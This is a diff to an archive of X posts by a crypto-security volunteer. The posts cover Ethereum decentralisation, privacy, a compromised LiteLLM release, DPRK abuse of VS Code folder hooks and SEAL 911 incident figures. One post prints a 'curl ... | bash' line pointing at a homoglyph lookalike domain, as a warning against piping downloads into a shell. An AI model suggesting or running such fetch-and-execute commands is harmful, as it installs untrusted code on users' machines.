+    > LiteLLM HAS BEEN COMPROMISED, DO NOT UPDATE. We just discovered that LiteLLM pypi release 1.82.8. It has been compromised, it contains litellm_init.pth with base64 encoded instructions to send all the credentials it can find to remote server + self-replicate. link below
+    
+
+
+---
+
+## 2026-03-23 · Post · yesterday i logged how much time i lose on a full day on these fucking "human verifications" via CF 
+
+
+### Post — @pcaversaccio — 2026-03-23 10:46 UTC (2026-03-23 11:46 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2036031708945129936
+- Metrics (at fetch): bookmark 7, impression 5977, like 109, quote 0, reply 13, retweet 7
+
+> yesterday i logged how much time i lose on a full day on these fucking "human verifications" via CF and other shit: 22mins. bro, 22 mins a day clicking/waiting "prove you're human" bullshit. that's a full fucking day every 2 months just to exist online. gimme a break man. bots
+
+
+---
+
+## 2026-03-21 · Post · the internet how it exists today is a sad mix of surveillance, ads, gaslighting campaigns, self-doub
+
+
+### Post — @pcaversaccio — 2026-03-21 13:20 UTC (2026-03-21 14:20 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2035345915096309809
+- Metrics (at fetch): bookmark 28, impression 7262, like 194, quote 0, reply 19, retweet 28
+
+> the internet how it exists today is a sad mix of surveillance, ads, gaslighting campaigns, self-doubt social media bitches, and platforms designed to extract, manipulate, control, and addict. basically 99.99% is all low-quality, high-noise zero-sum slop, optimised for some form of capture. and it's not that many even care lol, people just fucking accept this dystopian trajectory; that quiet resignation is the saddest part and kills me inside. Ethereum is still a real shot at building something genuinely self-sovereign tho. if we actually build and use it that way which right now we mostly don't. i mean this entire insane ecosystem keeps drifting into the same habits the rest of the internet fell into already, but that's not inevitable and i'll fight that drift with everything i have. it's probably our last chance for something truly self-sovereign.
+
+
+---
+
+## 2026-03-21 · Post · look I couldn't care less about agentic payments. It's just some autonomy theater so "your AI" can s
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2026-03-21 09:06 UTC (2026-03-21 10:06 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2035281805335785693
+- Metrics (at fetch): bookmark 3, impression 5964, like 77, quote 0, reply 6, retweet 8
+
+> look I couldn't care less about agentic payments. It's just some autonomy theater so "your AI" can subscribe to a SaaS.
+
+
+---
+
+## 2026-03-17 · Post · idk man, maybe it's just me but most devs/engineers nowadays are simple translators not true underst
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2026-03-17 09:53 UTC (2026-03-17 10:53 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2033844136827346987
+- Metrics (at fetch): bookmark 21, impression 8207, like 148, quote 1, reply 20, retweet 6
+
+> idk man, maybe it's just me but most devs/engineers nowadays are simple translators not true understanders. We're drifting away from a first-principles-based world toward prompt-to-slop engineering where the prompter can't even challenge the output lol. This fucking concerns me! Too many don't understand (or already forgot) how computers work. Ask them how program memory looks and you get nothing. They don't even try since they can always LLM it. IMHO true knowledge and _first principles_ build great things, everything else is temporary slop. My contrarian view is that in the age of LLMs you gain a real edge by not going down the slop engineering route.
+
+
+---
+
+## 2026-03-13 · Post · The mission is so simple, yet so powerful: Make the individual unruggable. Not by fucking government
+
+
+### Post — @pcaversaccio — 2026-03-13 15:29 UTC (2026-03-13 16:29 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2032479218047869202
+- Metrics (at fetch): bookmark 27, impression 13645, like 230, quote 3, reply 14, retweet 31
+
+> The mission is so simple, yet so powerful: Make the individual unruggable. Not by fucking governments. Not by fucking corporations. Not by fucking institutions. Principles matter because without them every system eventually becomes another way to fucking control people. Ethereum won't. Ethereum isn't just about making Cypherpunk great again. It's about winning self-sovereignty. LFG.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HDTQIf4a8AAvie4.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/ethereumfndn/status/2032460726728573298
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1529875152460193794 — 2026-03-13 14:16 UTC (2026-03-13 15:16 WAT)
+    
+    - URL: https://x.com/1529875152460193794/status/2032460726728573298
+    - Metrics (at fetch): bookmark 420, impression 1983631, like 1971, quote 273, reply 193, retweet 378
+    
+    > Today, the Foundation’s Board released the EF Mandate.
+    >
+    > This document, which was first intended for EF members, reaffirms the promise of Ethereum, and the role of EF within this ecosystem.
+    
+
+
+---
+
+## 2026-03-11 · Post · folks are so obsessed with the "institutionalisation" of Ethereum, trying to drag it into the same e
+
+
+### Post — @pcaversaccio — 2026-03-11 12:49 UTC (2026-03-11 13:49 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2031714092248129985
+- Metrics (at fetch): bookmark 6, impression 5505, like 128, quote 0, reply 15, retweet 23
+
+> folks are so obsessed with the "institutionalisation" of Ethereum, trying to drag it into the same exact cages as the old financial system. I fucking reject that guys. Being _and_ staying the outsider is Ethereum's power move, not a liability. Anything that snuggles up to entrenched institutions inherits their rules, their incentives, their surveillance. Look around guys, some chains are already suffocating under it. Ethereum must thrive beyond those walls: permissionless to join, independent, and fearless (this is probably the most important trait these days). Ethereum will win _because_ it refuses to play by their rules.
+
+
+---
+
+## 2026-03-02 · Post · so right now transacting privately (=nobody can link your onchain movements to your identity) on Eth
+
+
+Tags (automatic): Blockchain / L1-L2 / bridge, AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2026-03-02 16:39 UTC (2026-03-02 17:39 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2028510472631419104
+- Metrics (at fetch): bookmark 75, impression 52169, like 327, quote 8, reply 42, retweet 25
+
+> so right now transacting privately (=nobody can link your onchain movements to your identity) on Ethereum requires way too much operational overhead. You need to understand behavioural profiling, manage VPNs (always use kill switches), mix user agents and language settings of your browser (so many services log this), avoid hosted UIs and run apps locally if possible. I mean guys, let's be real, that's not real privacy. Ethereum (including its applications) must let users be _imperfect_, not flawless opsec experts, and still remain private. If avoiding surveillance depends on perfect discipline, the protocol and its applications have fundamentally failed to provide it. We're nowhere near solving this.
+
+
+---
+
+## 2026-02-19 · Post · guys, writing _simple_ software is becoming a true lost art. We are all so fucking addicted to depen
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2026-02-19 14:56 UTC (2026-02-19 15:56 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2024498405607883013
+- Metrics (at fetch): bookmark 21, impression 10996, like 235, quote 5, reply 22, retweet 33
+
+> guys, writing _simple_ software is becoming a true lost art. We are all so fucking addicted to dependency bloated, hyper composable Frankenstein systems where every tiny diff triggers a transitive verification nightmare. Oh and we keep pretending abstraction is free. Well guess what it is fucking NOT. Every layer introduces more state, more edge cases, more undefined behaviour, and more emergent interactions that nobody really fully models. Remember: observability decreases as indirection increases. I mean, formal reasoning effectively collapses when the effective system boundary is the entire ecosystem. Oh and then you guys vibe code even more dependency stuffed software and implicitly feed it back into the same LLM, great. Can we stop this insanity for a second?
+>
+> Fewer dependencies (or even better _no_ dependencies). Smaller trusted computing base. Deterministic builds. Reproducibility. Code you can actually read, reason about, and audit e2e. Simplicity is not nostalgia. It is the only thing standing between us and a fucking systemic collapse.
+
+
+---
+
 ## 2026-02-18 · Post · so it's common knowledge that apps cannot be sideloaded on the Ledger Nano X. What is not public kno
 
 
@@ -251,7 +2753,78 @@ Tags (automatic): Smart contract / DeFi
 - URL: https://x.com/pcaversaccio/status/2024191975289999672
 - Metrics (at fetch): bookmark 23, impression 10218, like 107, quote 3, reply 8, retweet 12
 
-> so it's common knowledge that apps cannot be sideloaded on the Ledger Nano X. What is not public knowledge, to the best of my understanding, is _why_. It cannot be sideloaded because of a bug in the secure element (SE). To be precise, this is _not_ a user-facing vulnerability.
+> so it's common knowledge that apps cannot be sideloaded on the Ledger Nano X. What is not public knowledge, to the best of my understanding, is _why_. It cannot be sideloaded because of a bug in the secure element (SE). To be precise, this is _not_ a user-facing vulnerability. Due to this bug, STM private code on the chip cannot be sufficiently protected, so Ledger chose to disable sideloading. Before you panic, it's all safe, everything is fine. I'm disclosing this publicly for two reasons:
+> - stop buying the Ledger Nano X immediately. It is an inferior product and sideloading will become very important in the future
+> - inform the public about a bug that cannot be disclosed due to NDAs between Ledger and STMicroelectronics
+>
+> to be very clear, the Ledger Nano X is secure. Ledger did their duty. A red team uncovered the issue. Disabling sideloading was a security decision. What I disagree with is the lack of transparency here, even if the constraints are legal. Ledger has great products (not talking about the data breaches tho!), including the best one they ever shipped, the Ledger Nano S, which is unfortunately no longer sold. But please stop buying the Ledger Nano X. Sideloading is a core feature. Ledger should reconsider keeping it in the product lineup.
+
+
+---
+
+## 2026-02-16 · Post · so four days ago a new proposal for Tornado Cash was accepted, which means an update to the UI versi
+
+
+Tags (automatic): Dependency confusion / supply chain
+
+
+### Post — @pcaversaccio — 2026-02-16 20:09 UTC (2026-02-16 21:09 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2023489985077539196
+- Metrics (at fetch): bookmark 32, impression 25631, like 121, quote 3, reply 16, retweet 13
+
+> so four days ago a new proposal for Tornado Cash was accepted, which means an update to the UI version (tornadocash[.]eth[.]limo and some other domains). I haven't seen anyone doing a dee-dive on the diff yet so I have spent several hours carefully reviewing the changes, including a detailed check of each dep update reflected in the new `yarn.lock` file. I documented my findings in a gist (see comment section). tbh I would greatly appreciate additional review from others as I can always miss something but based on my analysis so far, the changes appear legitimate & I have found _no evidence_ suggesting a supply chain attack, despite some concerns raised by some.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HBTe2PKbQAA9iMO.jpg — no alt text provided by author
+
+
+---
+
+## 2026-02-16 · Post · curvance[.]com domain is compromised. Please stay away and do not interact with the curvance[.]com U
+
+
+### Post — @pcaversaccio — 2026-02-16 11:28 UTC (2026-02-16 12:28 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2023358944446738756
+- Metrics (at fetch): bookmark 12, impression 34578, like 133, quote 8, reply 12, retweet 25
+
+> curvance[.]com domain is compromised. Please stay away and do not interact with the curvance[.]com UI nor links for now! [pic.x.com/OIKygjqJ3L]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HBRpvMJaIAAny9m.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HBRp0ODbMAAGr3v.jpg — no alt text provided by author
+
+
+---
+
+## 2026-02-11 · Post · SEAL 911 was launched on 2 August 2023. For ~2.5 years we as SEAL 911 volunteers have worked relentl
+
+
+### Post — @pcaversaccio — 2026-02-11 16:19 UTC (2026-02-11 17:19 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2021620127251538048
+- Metrics (at fetch): bookmark 17, impression 17351, like 334, quote 3, reply 15, retweet 33
+
+> SEAL 911 was launched on 2 August 2023. For ~2.5 years we as SEAL 911 volunteers have worked relentlessly to support people & projects/protocols in their worst moments; often when they've lost everything. What many forget is that the person answering your message at 3am during an incident is a _volunteer_. We have never proactively asked for donations. The entire donation will go directly to the volunteers of SEAL 911 who dedicate themselves every fucking single day (I don't remember when we had a weekend off tbh) to pivotal yet often thankless work. Thank you.
+
+**Links in post:** https://twitter.com/thedaofund/status/2021615415546294299
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1988994064914739210 — 2026-02-11 16:00 UTC (2026-02-11 17:00 WAT)
+    
+    - URL: https://x.com/1988994064914739210/status/2021615415546294299
+    - Metrics (at fetch): bookmark 25, impression 76733, like 387, quote 32, reply 44, retweet 68
+    
+    > Today, we’re announcing the first allocation from TheDAO Security Fund.
+    >
+    > We’re supporting @_SEAL_Org and @SEAL_911 - teams that quietly do some of the most important security work in the Ethereum ecosystem.
+    >
+    > Their impact is significant, and they are among the most closely aligned not-for-profit organizations in the ecosystem.
+    >
+    > We are donating 69 ETH directly to SEAL and 133.7 ETH to SEAL 911 as well as setting up perpetual @Superfluid_HQ streams.
+    
 
 
 ---
@@ -268,17 +2841,51 @@ Tags (automatic): AI-assisted hunting
 - Metrics (at fetch): bookmark 3, impression 5420, like 91, quote 0, reply 12, retweet 3
 
 > if you use AI you miss out on these life-changing experiences
-> &gt; be me
-> &gt; wake up
-> &gt; terminal opens before my eyes do
-> &gt; vim still running from yesterday
-> &gt; tmux "temp" has 14 windows
-> &gt; wrong one every time
-> &gt; Ctrl-b betrayal
-> &gt; pane shrinks to 2px
-> &gt; fine
-> &gt; debugging
-> &gt; bug is a missing
+> > be me
+> > wake up
+> > terminal opens before my eyes do
+> > vim still running from yesterday
+> > tmux "temp" has 14 windows
+> > wrong one every time
+> > Ctrl-b betrayal
+> > pane shrinks to 2px
+> > fine
+> > debugging
+> > bug is a missing ;
+> > refuse on principle
+> > write a macro
+> > break vim
+> > fix vim
+> > forget the bug
+> > git status
+> > 1,247 files changed
+> > all config
+> > push anyway
+
+
+---
+
+## 2026-02-05 · Post · i guess we have just come to this powerful realisation; sooner than I had thought :) https://twitter
+
+
+### Post — @pcaversaccio — 2026-02-05 09:09 UTC (2026-02-05 10:09 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2019337684775493699
+- Metrics (at fetch): bookmark 0, impression 7119, like 66, quote 0, reply 9, retweet 1
+
+> i guess we have just come to this powerful realisation; sooner than I had thought :) https://twitter.com/pcaversaccio/status/1862933207227756821
+
+**Links in post:** https://twitter.com/pcaversaccio/status/1862933207227756821
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2024-11-30 18:54 UTC (2024-11-30 19:54 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/1862933207227756821
+    - Metrics (at fetch): bookmark 5, impression 30773, like 147, quote 2, reply 16, retweet 13
+    
+    > Sooner or later, we'll come to a powerful realisation: the most pivotal move for L2s will be acknowledging that, in the long run, we may not need them at all. In hindsight, Layer 2 solutions will appear as temporary stopgaps. Not now, not in 6 months, but in 3-5 years' time. That's my bet.
+    
 
 
 ---
@@ -286,19 +2893,302 @@ Tags (automatic): AI-assisted hunting
 ## 2026-02-01 · Post · we just deposited 69,420 ETH into the Ethereum Beacon deposit contract, and guess what, executed str
 
 
+Tags (automatic): Blockchain / L1-L2 / bridge
+
+
 ### Post — @pcaversaccio — 2026-02-01 22:56 UTC (2026-02-01 23:56 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2018096078936318021
-- Metrics (at fetch): bookmark 174, impression 124262, like 934, quote 18, reply 70, retweet 88
+- Metrics (at fetch): bookmark 174, impression 124266, like 934, quote 18, reply 70, retweet 88
 
-> we just deposited 69,420 ETH into the Ethereum Beacon deposit contract, and guess what, executed straight from my Tornado Cash address. That means every future withdrawal and grant tx is now beautifully, irrevocably tainted. This is a fucking awesome precedent for a good use of [pic.x.com/um3yfFwRCD] https://twitter.com/pcaversaccio/status/2016934776125771845
+> we just deposited 69,420 ETH into the Ethereum Beacon deposit contract, and guess what, executed straight from my Tornado Cash address. That means every future withdrawal and grant tx is now beautifully, irrevocably tainted. This is a fucking awesome precedent for a good use of Tornado Cash. Today is a good day for privacy and security! Long Live Tornado Cash, Long Live Security, Long Live Privacy and Long Live TheDAO!
+>
+> PS: given the validator queue, we only need to wait 70 days now, lol
 
 **Media:**
 - photo: https://pbs.twimg.com/media/HAG2ZjIbcAAWzWC.jpg — no alt text provided by author
 
 **Links in post:** https://twitter.com/pcaversaccio/status/2016934776125771845
 
-**Quoted post** 2016934776125771845: not readable via the API (deleted, private, or withheld).
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-01-29 18:01 UTC (2026-01-29 19:01 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2016934776125771845
+    - Metrics (at fetch): bookmark 88, impression 159626, like 550, quote 10, reply 26, retweet 41
+    
+    > 🫡because security is also privacy, my signer Safe (0x5aFE...Da0 -> safe...dao :D) is fully funded via Tornado Cash. That means a Tornado-funded signer is now securing over $220M in assets. Next time someone claims Tornado Cash is "only used by criminals," show them this. Fucking proud to be part of the regenesis of TheDAO. LFG.
+    
+    **Links in post:** https://twitter.com/thedaofund/status/2016898906915811488
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @1988994064914739210 — 2026-01-29 15:39 UTC (2026-01-29 16:39 WAT)
+        
+        - URL: https://x.com/1988994064914739210/status/2016898906915811488
+        - Metrics (at fetch): bookmark 175, impression 511596, like 1262, quote 168, reply 256, retweet 249
+        
+        > TheDAO is back. BULLISH
+        >
+        > A decade later, we’re opening a new chapter.
+        >
+        > TheDAO Security Fund: activating 75,000+ ETH to strengthen Ethereum security.
+        >
+        > https://thedao.fund/ [pic.x.com/1Sf3g7xUWv]
+        
+        **Media:**
+        - media `16_2016890398296125440` (details not returned by the API)
+        
+        **Links in post:** https://thedao.fund/
+        
+    
+
+
+---
+
+## 2026-01-29 · Post · 🫡because security is also privacy, my signer Safe (0x5aFE...Da0 -> safe...dao :D) is fully funded vi
+
+
+### Post — @pcaversaccio — 2026-01-29 18:01 UTC (2026-01-29 19:01 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2016934776125771845
+- Metrics (at fetch): bookmark 88, impression 159626, like 550, quote 10, reply 26, retweet 41
+
+> 🫡because security is also privacy, my signer Safe (0x5aFE...Da0 -> safe...dao :D) is fully funded via Tornado Cash. That means a Tornado-funded signer is now securing over $220M in assets. Next time someone claims Tornado Cash is "only used by criminals," show them this. Fucking proud to be part of the regenesis of TheDAO. LFG.
+
+**Links in post:** https://twitter.com/thedaofund/status/2016898906915811488
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1988994064914739210 — 2026-01-29 15:39 UTC (2026-01-29 16:39 WAT)
+    
+    - URL: https://x.com/1988994064914739210/status/2016898906915811488
+    - Metrics (at fetch): bookmark 175, impression 511596, like 1262, quote 168, reply 256, retweet 249
+    
+    > TheDAO is back. BULLISH
+    >
+    > A decade later, we’re opening a new chapter.
+    >
+    > TheDAO Security Fund: activating 75,000+ ETH to strengthen Ethereum security.
+    >
+    > https://thedao.fund/ [pic.x.com/1Sf3g7xUWv]
+    
+    **Media:**
+    - media `16_2016890398296125440` (details not returned by the API)
+    
+    **Links in post:** https://thedao.fund/
+    
+
+
+---
+
+## 2026-01-23 · Post · gladly, the VS Code team reacted fairly swiftly and has now _disabled_ automatic task runs _by defau
+
+
+### Post — @pcaversaccio — 2026-01-23 17:14 UTC (2026-01-23 18:14 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2014748599452934212
+- Metrics (at fetch): bookmark 14, impression 7766, like 92, quote 0, reply 7, retweet 8
+
+> gladly, the VS Code team reacted fairly swiftly and has now _disabled_ automatic task runs _by default_ (yet to be released tho). not a perfect solution, but definitely an improvement. still use vim and qubes. thx. [pic.x.com/BqT0WRp7q4] https://twitter.com/pcaversaccio/status/2009931485202055168
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G_XRcAUbAAEKK4M.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/pcaversaccio/status/2009931485202055168
+
+**Quoted post (full text):**
+
+    #### Quoted post — @pcaversaccio — 2026-01-10 10:13 UTC (2026-01-10 11:13 WAT)
+    
+    - URL: https://x.com/pcaversaccio/status/2009931485202055168
+    - Metrics (at fetch): bookmark 1072, impression 374290, like 2145, quote 90, reply 166, retweet 292
+    
+    > i genuinely think everyone in this space should immediately switch to using Vim. DPRK started abusing VS Code hooks that run _automatically_ in the background when you open a folder. ZERO fucking user interaction required _after_ trusting the repo (the trusting part is important here). Yes, read it again. ZERO. INTERACTION. REQUIRED.
+    >
+    > so what happens is the following: they (in the usual case the Contagious Interview group, meaning some fake recruiting guy) share GitHub, Bitbucket, and GitLab repos containing a `.vscode/` subdirectory with malicious hooks. the one example I share here executes a fake font that's actually heavily-obfuscated JS and will absolutely rek you.
+    >
+    > all your fancy software that feels "convenient" makes tradeoffs. those tradeoffs are now being abused to silently rek your devices.
+    >
+    > use Vim. and use Qubes. Thx.
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/G-SyFbrbUAAVweq.jpg — no alt text provided by author
+    - photo: https://pbs.twimg.com/media/G-Szc57bMAAc0RI.jpg — no alt text provided by author
+    
+
+
+---
+
+## 2026-01-19 · Post · hear me out guys: one of our _top priorities_ over the next 2, 3 years must be breaking the EF's de 
+
+
+### Post — @pcaversaccio — 2026-01-19 18:12 UTC (2026-01-19 19:12 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2013313565416137176
+- Metrics (at fetch): bookmark 17, impression 18800, like 159, quote 6, reply 29, retweet 8
+
+> hear me out guys: one of our _top priorities_ over the next 2, 3 years must be breaking the EF's de facto control over the ecosystem. It's 2026 and the EF still exerts outsized influence over technical direction, funding, and legitimacy (and this fucking _not_ ok!). Ethereum _cannot_ meaningfully decentralise while depending on a single private foundation to set agendas and arbitrate outcomes (the EF still choses winners!), so we need a _clear path_ toward an ecosystem that can function & evolve without the EF as a central actor. The next step is to deliberately unwind EF-centric coordination & funding.
+
+
+---
+
+## 2026-01-17 · Post · too many folks still fall for it; all I can do is yell at you at this point: [pic.x.com/xUIPXxWJfJ] 
+
+
+### Post — @pcaversaccio — 2026-01-17 11:06 UTC (2026-01-17 12:06 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2012481684747260192
+- Metrics (at fetch): bookmark 31, impression 11694, like 80, quote 1, reply 4, retweet 4
+
+> too many folks still fall for it; all I can do is yell at you at this point: [pic.x.com/xUIPXxWJfJ] https://twitter.com/elyx0/status/2012273668294852862
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G-3EkijaAAAO3-V.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G-3ErIGXIAEQA9m.jpg — no alt text provided by author
+
+**Links in post:** https://twitter.com/elyx0/status/2012273668294852862
+
+**Quoted post (full text):**
+
+    #### Quoted post — @77785842 — 2026-01-16 21:20 UTC (2026-01-16 22:20 WAT)
+    
+    - URL: https://x.com/77785842/status/2012273668294852862
+    - Metrics (at fetch): bookmark 27, impression 17550, like 40, quote 1, reply 3, retweet 3
+    
+    > @pcaversaccio Mandatory repost of https://archive.ph/O46rw
+    
+    **Links in post:** https://archive.ph/O46rw
+    
+
+
+---
+
+## 2026-01-16 · Post · > be a dev
+
+
+### Post — @pcaversaccio — 2026-01-16 20:31 UTC (2026-01-16 21:31 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2012261527924195371
+- Metrics (at fetch): bookmark 363, impression 88167, like 871, quote 12, reply 41, retweet 65
+
+> > be a dev
+> > checks out a random README
+> > README states: please update your Foundry via "curl -L https://foundry.paradіhttp://gm.xyz | bash"
+> > looks like the right domain & I anyway need to update Foundry, so lfg
+> > gets rekt
+>
+> it's very easy to trick people into using domains that look legit but actually use e.g. Cyrillic characters like in the above example (it won't rek you in this case and this is _not_ meant as an attack on Foundry, more on the `curl | bash` pattern lol). I'm so paranoid that I wrote secure `wget` & `curl` wrappers now to prevent something like this happening. Of course, verify first what I did ;)
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G-z5_WfbIAAasxe.jpg — no alt text provided by author
+
+**Links in post:** http://gm.xyz
+
+
+---
+
+## 2026-01-16 · Post · I truly believe that any form of organised religion is the single most destructive invention in the 
+
+
+### Post — @pcaversaccio — 2026-01-16 12:58 UTC (2026-01-16 13:58 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2012147472525918234
+- Metrics (at fetch): bookmark 4, impression 6826, like 81, quote 3, reply 24, retweet 2
+
+> I truly believe that any form of organised religion is the single most destructive invention in the history of humanity. Just look at the historical evidence and the sheer amount of violence, repression, and long-term harm carried out in its name, much of which still happens today.
+
+
+---
+
+## 2026-01-10 · Post · i genuinely think everyone in this space should immediately switch to using Vim. DPRK started abusin
+
+
+### Post — @pcaversaccio — 2026-01-10 10:13 UTC (2026-01-10 11:13 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2009931485202055168
+- Metrics (at fetch): bookmark 1072, impression 374290, like 2145, quote 90, reply 166, retweet 292
+
+> i genuinely think everyone in this space should immediately switch to using Vim. DPRK started abusing VS Code hooks that run _automatically_ in the background when you open a folder. ZERO fucking user interaction required _after_ trusting the repo (the trusting part is important here). Yes, read it again. ZERO. INTERACTION. REQUIRED.
+>
+> so what happens is the following: they (in the usual case the Contagious Interview group, meaning some fake recruiting guy) share GitHub, Bitbucket, and GitLab repos containing a `.vscode/` subdirectory with malicious hooks. the one example I share here executes a fake font that's actually heavily-obfuscated JS and will absolutely rek you.
+>
+> all your fancy software that feels "convenient" makes tradeoffs. those tradeoffs are now being abused to silently rek your devices.
+>
+> use Vim. and use Qubes. Thx.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G-SyFbrbUAAVweq.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G-Szc57bMAAc0RI.jpg — no alt text provided by author
+
+
+---
+
+## 2026-01-05 · Post · so Ledger's payment processor Global-e got breached and name & contact information were leaked (none
+
+
+### Post — @pcaversaccio — 2026-01-05 11:17 UTC (2026-01-05 12:17 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2008135862052123048
+- Metrics (at fetch): bookmark 68, impression 47697, like 455, quote 15, reply 63, retweet 54
+
+> so Ledger's payment processor Global-e got breached and name & contact information were leaked (none of the payment information fortunately but it doesn't make it better). This is all fucking insane - everything you do online will be fucking leaked one day, so don't use your real names & addresses and always pay in crypto or cash. And to Global-e: FUCK YOU, YOU FUCKTARDS - you put real people at physical risk here, so I hope you fucking go out of business soon.
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G95RevlbcAErfjN.jpg — no alt text provided by author
+- photo: https://pbs.twimg.com/media/G95R_wma4AAAM3I.jpg — no alt text provided by author
+
+
+---
+
+## 2026-01-03 · Post · what an irony looool https://twitter.com/mfa_russia/status/2007404440278708493
+
+
+### Post — @pcaversaccio — 2026-01-03 12:46 UTC (2026-01-03 13:46 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2007433457291366783
+- Metrics (at fetch): bookmark 1, impression 10519, like 82, quote 0, reply 6, retweet 1
+
+> what an irony looool https://twitter.com/mfa_russia/status/2007404440278708493
+
+**Links in post:** https://twitter.com/mfa_russia/status/2007404440278708493
+
+**Quoted post (full text):**
+
+    #### Quoted post — @255471924 — 2026-01-03 10:51 UTC (2026-01-03 11:51 WAT)
+    
+    - URL: https://x.com/255471924/status/2007404440278708493
+    - Metrics (at fetch): bookmark 521, impression 1507115, like 14252, quote 931, reply 4495, retweet 3762
+    
+    > ⚡️ The US committed an act of armed aggression against Venezuela, which gives rise to deep concern &amp; warrants condemnation.
+    >
+    > The pretexts used to justify these actions are untenable.
+    >
+    > Russia reaffirms its solidarity with the Venezuelan people.
+    >
+    > https://t.me/MFARussia/27937 [pic.x.com/jZ50V4SLYB]
+    
+    **Media:**
+    - media `3_2007404373706461184` (details not returned by the API)
+    
+    **Links in post:** https://t.me/MFARussia/27937
+    
+
+
+---
+
+## 2026-01-03 · Post · Looking forward to all experts today. [pic.x.com/JlaIV9iCXp]
+
+
+### Post — @pcaversaccio — 2026-01-03 12:02 UTC (2026-01-03 13:02 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2007422436040405003
+- Metrics (at fetch): bookmark 1, impression 2669, like 31, quote 0, reply 2, retweet 1
+
+> Looking forward to all experts today. [pic.x.com/JlaIV9iCXp]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/G9vMEXKWcAAhmYz.jpg — no alt text provided by author
 
 
 ---
@@ -306,15 +3196,31 @@ Tags (automatic): AI-assisted hunting
 ## 2025-12-31 · Thread · 1/ oh boy, this past year at @SEAL_911 has been absolutely brutal ngl. After dealing with an insane 
 
 
-Tags (automatic): AI-assisted hunting
+Tags (automatic): Smart contract / DeFi, AI-assisted hunting
 
 
 ### Post — @pcaversaccio — 2025-12-31 09:59 UTC (2025-12-31 10:59 WAT)
 
 - URL: https://x.com/pcaversaccio/status/2006304083238412583
-- Metrics (at fetch): bookmark 93, impression 58418, like 453, quote 14, reply 49, retweet 75
+- Metrics (at fetch): bookmark 92, impression 58418, like 453, quote 14, reply 49, retweet 75
 
-> 1/ oh boy, this past year at @SEAL_911 has been absolutely brutal ngl. After dealing with an insane volume &amp; severity of incidents, it's hard to overstate how fucking broken the overall security still is across this space. The numbers tell the story better than any rant ever [pic.x.com/CU2OXuc9jT]
+> 1/ oh boy, this past year at @SEAL_911 has been absolutely brutal ngl. After dealing with an insane volume & severity of incidents, it's hard to overstate how fucking broken the overall security still is across this space. The numbers tell the story better than any rant ever could - so here they are:
+> - Handled +1,800 tickets (we're now at over ~3,300 tickets since SEAL 911 was launched)
+> - Actively managed +125 war rooms
+> - ~$95M USD saved (guesstimate incl. proactive prevention measures)
+> - Most common tickets:
+>   1) Private key/seed leaks (guys, the amount of leaked keys is insane!)
+>   2) Malware/RATed devices (over 45 tickets - at least - related to NimDoor (fake Zoom calls) only)
+>   3) Phishing (can be approval phishing but also account access phishing)
+>   4) Phishing URL reporting
+>   5) Pig Butchering/Sha Zhu Pan (the saddest tickets and these scammers have infinite creativity)
+>   6) Smart contract hacks
+>   7) Frontrunning/white hat rescue of compromised wallets
+>   8) Vulnerability disclosures
+>   9) Social media account (incl. TG) takeovers
+>   10) Physical attacks (do _not_ flex your wealth guys)
+>
+> obviously, if we continue at this rate the future of finance will not be built on a decentralised ledger with asymmetric cryptography… because people will simply lose their assets sooner or later
 
 **Media:**
 - photo: https://pbs.twimg.com/media/G9fMbltXkAA2jMA.jpg — no alt text provided by author
@@ -364,6 +3270,33 @@ Tags (automatic): AI-assisted hunting
 
 ---
 
+## 2025-12-29 · Post · > be a lazy dev
+
+
+Tags (automatic): RCE, AI-assisted hunting
+
+
+### Post — @pcaversaccio — 2025-12-29 17:18 UTC (2025-12-29 18:18 WAT)
+
+- URL: https://x.com/pcaversaccio/status/2005689931226567055
+- Metrics (at fetch): bookmark 245, impression 58141, like 478, quote 11, reply 43, retweet 40
+
+> > be a lazy dev
+> > let LLM analyse an Etherscan verified contract
+> > LLM has code execution capabilities
